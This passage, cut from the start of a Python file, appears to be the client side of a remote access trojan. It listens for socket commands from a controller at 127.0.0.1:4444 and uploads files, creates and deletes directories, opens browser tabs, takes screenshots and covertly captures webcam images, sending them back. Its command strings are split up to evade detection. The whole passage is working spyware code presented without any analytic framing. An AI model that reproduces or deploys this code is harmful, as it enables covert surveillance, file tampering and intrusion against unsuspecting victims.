                    s.send(data)
                except:
                    self.errorsend()

            elif c1 == 'uplo' + 'ad':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif c1[:5] == 'mk' + 'dir':
                try:
                    os.mkdir(c1[6:])
                    s.send(f'Directory {c1[6:]} was created'.encode())
                except:
                    self.errorsend()
            
            elif c1[:5] == 'rm' + 'dir':
                try:
                    shutil.rmtree(c1[6:])
                    s.send(f'Directory {c1[6:]} was removed'.encode())
                except:
                    self.errorsend()
            
            elif c1 == 'bro' + 'wser':
                quiery = s.recv(6000)
                quiery = quiery.decode()
                try:
                    if re.search(r'\.', quiery):
                        webbrowser.open_new_tab('ht' + 'tps://' + quiery)
                    elif re.search(r'\ ', quiery):
                        webbrowser.open_new_tab('https://yandex.' + 'ru/search/?text='+quiery)
                    else:
                        webbrowser.open_new_tab('https://yande' + 'x.ru/search/?text=' + quiery)
                    s.send("The tab is opened".encode())
                except:
                    self.errorsend()
            
            elif c1 == 'scre' + 'enshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
            
            elif c1 == 'webc' + 'am_snap':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    global return_value, i
                    cam = cv2.VideoCapture(0)
                    for i in range(1):
                        return_value, image = cam.read()
                        filename = cv2.imwrite(f'{file}', image)
                    del(cam)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif c1 == 'exit':
                s.send(b"exit")
                break

bicho = CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    bicho.build_connection()
    bicho.execute()
